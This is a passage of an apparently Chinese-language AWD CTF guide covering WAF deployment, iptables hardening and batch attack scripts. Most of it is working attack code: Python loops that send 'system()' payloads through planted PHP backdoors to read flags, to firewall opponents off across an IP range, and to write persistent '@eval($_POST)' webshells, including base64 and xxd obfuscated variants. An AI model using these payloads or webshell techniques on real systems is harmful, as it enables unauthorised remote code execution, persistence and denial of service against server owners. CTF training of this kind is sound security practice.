cd /var/www/html/ (or other web dir)

   git clone https://github.com/wupco/weblogger.git

   chmod -R 777 weblogger/

   open http://xxxxx/weblogger/install.php in Web browser

   install it
```



## 

## WAF

waf的作用：
1.最重要是分析流量，别人攻击我们的时候，我们可以看到别人的攻击方式。这样的话即使我们找 不到攻击点，非常苦恼的时候，我们就可以分析流量，使用别人的攻击方式。
2.可以直接进行防御，类似于一台防火墙（一般的比赛是不允许使用的，毕竟比赛时间短，就根本绕不过去waf，那比赛就没意思了）

有些比赛是不允许上通用waf的，check机制可能会check到waf过滤的参数，导致宕机，waf部署需要谨慎，还需要注意的是：上完waf检查服务是否可用，部分检查允许使用部分小的waf，会检查页面完整性、服务完整性。

常用的waf使用方法，是用你要保护的文件去包含这个waf.php。比如说，你要保护select.php，那么你就在select.php里面写上一行include './waf.php'或者 require_once('waf.php');
如果你要保护所有文件，那么就在config这种配置文件里包含waf，因为这种config的文件，一般会被大部分功能页面调用

网上很多waf脚本，这里介绍几个waf项目

**1.AWD_PHP_WAF**
项目地址：https://github.com/NonupleBroken/AWD_PHP_WAF

使用方法：
使用前先修改config.php内的密码，密码使用sha256加密

```
上waf：
$ find . -path ./waffffff -prune -o -type f -name "*.php" -print | xargs sed -i "s/<?php/<?php include_once(\"\/var\/www\/html\/waffffff\/waf.php\");/g"

下waf：
$ find . -path ./waffffff -prune -o -type f -name "*.php" -print | xargs sed -i "s/<?php include_once(\"\/var\/www\/html\/waffffff\/waf.php\");/<?php/g"
```

比如访问 web 目录下的/waffffff/admin.php?password=123456

**2.CTF-WAF**
项目地址：https://github.com/sharpleung/CTF-WAF

**3.awd-watchbird**
这是个通防waf，支持流量转发和替换flag
项目地址：https://github.com/leohearts/awd-watchbird

1.打包好好之后直接上传到html目录下，回到终端，在上传的waf目录下，使用命令

```
php watchbird.php --install /var/www/html
```

这样就能使每个页面的php代码包含到waf下

2.运行waf 之后，打开我们的web 页面，在任意一个php 页面后面输入?watchbird=ui，就会进入到waf 配置页面然后设置密码(注意：第一次打开需要设置密码)

3.配置好之后就能进入内部网页

**4.AoiAWD**
项目地址：https://github.com/DasSecurity-HatLab/AoiAWD

使用方法：[AoiAWD-萌新的得分利器](https://www.wlhhlc.top/posts/16692/)
下载好，自己去编译或者找编译好的直接用

## 防御搅屎

在加固阶段，每个堡垒机都有一个Web在运行。而这些站点可能存在相应的漏洞和后门。基本上都会有shell留在隐秘的角落...

所以我们就可以通过前期搜寻到的后门，进行操作。这里直接用linux的防火墙进行关闭即可。

在正常情况下：这样的话就直接把系统的后门全杀掉了。只允许22 80 21端口可以进行访问。

首先开启 22 80 21

```
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 21 -j ACCEPT
```

然后关闭

```
iptables -A INPUT -j DROP
```

在手动一个个连shell搅shi的话，是非常慢的。于是写了个小脚本。

遍历整个IP段，并将防火墙开启全部屏蔽掉~~

```
import requests
url = "http://192.168.182"
port='80'
shell = "/shell.php"
passwd = "a"
payloads = {
    passwd:"system(\'iptables -A INPUT -j DROP');"
}
for i in range(1,254):
    urls = url+"."+str(i)+":"+port+shell
    print(urls+"\n")
    try:
        res = requests.post(urls,payloads,timeout=1)
        print(res.text)
    except:
        print("未找到主机")
```

# 编写批量脚本

以下脚本来自于我比赛时写的垃圾脚本，大佬勿喷。

### 1.利用后门getflag

单个shell获取flag

```
import requests

url="http://192.168.182.130/include/shell.php"
passwd="admin_ccmd"
payload = {passwd: 'system(\'cat /f*\');'}
res=requests.post(url,payload)
print(res.text)
```

### 2.后门批量getflag

针对端口变化利用后门批量获取flag

```
import requests

url1="http://192.168.182.130:"
url2=""

flaglist=[]

path="/include/shell.php"
passwd="admin_ccmd"


#payload = {passwd: 'system(\'cat /f*\');'}
payload = {passwd: 'system(\'cat /flag\');'}

i = 0

for url2 in range(8801,8805):
    url = url1 + str(url2) +path

    res=requests.post(url,payload)
    try:
        print(url1 + str(url2),res.text)
        # flag存入列表中
        flaglist.append(str(res.text))
        #print(flaglist[i])
        i += 1
    except:
        pass
```

### 3.利用后门批量getflag并提交

burp抓包，发现flag以json形式传输

```
POST /api/flag HTTP/1.1
Host: 192.168.182.130:39999
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Authorization: 9ad36c305d6a2d2514434a4c10e7e13f
Content-Length: 55
Origin: http://192.168.182.130:39999
Connection: close
Referer: http://192.168.182.130:39999/

{"flag":"SL{7a2ecc20361b7a104798b6bba6222b3972e114a2}"}
```

编写脚本自动获取flag并提交

```
# coding: UTF-8
import requests
import json

url1="http://xxxx:"
url2=""

flaglist=[]

path="/include/shell.php"
passwd="admin_ccmd"

flagadd="http://xxxx:8801/api/flag"   #提交flag的地址

#payload = {passwd: 'system(\'cat /f*\');'}
payload = {passwd: 'system(\'cat /flag\');'}


headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    }
headersflag={
        'Host': 'xxxx',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type': 'application/json;charset=utf-8',
        'Authorization': 'bada82467423a6526d4d25abbe8cc43a',
        'Origin': 'http://xxxx',
        'Referer': 'http://xxxx/',
    }

i = 0

for url2 in range(8802,8810):
    url = url1 + str(url2) +path
    #print(url1 + str(url2))
    res=requests.post(url,payload, headers=headers)
    try:
        print(url1 + str(url2),res.text)
        # flag存入列表中
        flaglist.append(str(res.text))
        #print(flaglist[i])
        body = {"flag": str(flaglist[i])}
        res = requests.post(flagadd, headers=headersflag, data=json.dumps(body))
        i += 1
    except:
        pass
```

如果嫌写脚本麻烦，可以把flag存入字典，利用burp爆破，也可以实现批量提交flag。不过大括号`{}`可能会被编码导致flag错误。

### 4.利用后门写shell

预留后门可能会被删除，要想持续拿分需要写shell，这里利用命令执行和代码执行来写马
**利用命令执行写马**

```
1.Linux下写shell
$ echo "<?php @eval(\$_POST[123]); ?>" > webshell.php
$ echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d > webshell.php   #base64编码绕过
$ echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps > webshell.php #xxd绕过


2.windows下写shell
>echo ^<?php eval($^_POST[123]); ?^> > webshell.php
```

**利用代码执行写马**

```
?code=fputs(fopen('./webshell.php.php','w'),'<?php @eval($_POST[123]);?>');

?code=file_put_contents('webshell.php.php', '<?php @eval($_POST[123]); ?> ');

?code=file_put_contents($_POST[f], $_POST[d]); 
post: f=webshell.php&d=<?php @eval($_POST[123]); ?>
```

然后利用脚本实现

```
# coding: UTF-8
import requests

url = "http://192.168.182.130:8808"

shell_path = url + "/include/shell.php"
shell_passwd = "admin_ccmd"

#利用预留后门
payload = {shell_passwd: 'system(\'cat /f*\');'}
res = requests.post(shell_path, payload)
print(res.text)


#payload1利用预留后门上传shell
payload1 = {shell_passwd: 'system(\'echo "<?php @eval(\$_POST[atkx]);?>" > /var/www/html/atkx.php\');'}
res = requests.post(shell_path, payload1)
print("shell已上传")

#payload2利用预留后门上传shell，并getflag
my_shell_path = url + "/atkx.php"
my_shell_passwd = "atkx"
payload2 = {my_shell_passwd: 'system(\'cat /f*\');'}
res = requests.post(my_shell_path, payload2)
print(res.text)
```

批量后门写shell

```
import requests

url_head="http://192.168.182.130"
for url2 in range(8801,8805):
    try:
        url =  url_head+":{}".format(url2)

        shell_path = url + "/include/shell.php"
        shell_passwd = "admin_ccmd"
        print(shell_path)

        #payload1利用预留后门上传shell
        payload1 = {shell_passwd: 'system(\'echo "<?php @eval(\$_POST[atkx]);?>" > /var/www/html/atkx1.php\');'}
        res = requests.post(shell_path, payload1)
        print(url + " shell写入成功！！！！！！！")
        #

        # #payload2通过上传的shell来getflag
        # my_shell_path = url + "/atkx1.php"
        # my_shell_passwd = "atkx"
        # payload2 = {my_shell_passwd: 'system(\'cat /flag\');'}
        # res = requests.post(my_shell_path, payload2)
        # print(url,res.text)
    except:
        pass
```

# 总结

1.预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少。

2.AWD一般使用的是cms，尽量多收集一些cms的POC和EXP，以备不时之需。

3.防守注意查看日志看别人是怎么攻击自己的，然后尝试攻击其他人，为了干扰别人，可以先打一波流量，混淆视听。

4.检查后门，保证自己的网站上没有d盾可以扫出来的后门，检查计划任务或者可疑进程。

5.比赛一轮大概几分钟，时间比较紧张，需要提高自己的代码审计能力以及自动化脚本的编写能力，实现自动化攻击。

参考文章：
https://blog.csdn.net/weixin_43510203/article/details/118519120
https://www.likecs.com/show-306005446.html
https://www.anquanke.com/post/id/86984
https://xz.aliyun.com/t/10995